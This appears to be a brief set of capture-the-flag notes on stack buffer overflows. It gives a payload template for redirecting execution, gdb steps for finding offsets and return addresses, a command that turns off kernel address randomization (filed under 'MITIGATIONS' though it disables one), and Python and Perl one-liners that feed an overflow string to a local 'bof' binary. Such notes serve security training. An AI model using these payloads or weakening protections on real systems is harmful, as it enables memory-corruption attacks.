# EXAMPLES

## STACK OVERFLOW
When overflowing, need to reallign stack before continuing return chain / do other stuff.  
*	note: only for Ubuntu LIBC.  

`payload = "A"*offset + return_addr_to_main + function_addr` : overflow to call function at `function_addr`  
*	`offset` : got with gdb/pattern   
*	`return_addr_to_main` : return address of `main`  
	1.	gdb:  
	2.	`disassemble main`  
	3.	argument of `ret` instruction  

## References:
*	https://www.youtube.com/watch?v=vqNQe9xjz2Q
*	https://ctftime.org/writeup/31259

## MITIGATIONS
Disable randomized addresses:  
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## MISC
bof 32bit exec, for CCIT:  
```bash
(python -c 'print "A"*64,"BBBB","\n"'; cat -) | ./bof :  
(perl -e 'print "A"x64,"BBBB","\n"'; cat -) | ./bof :   
```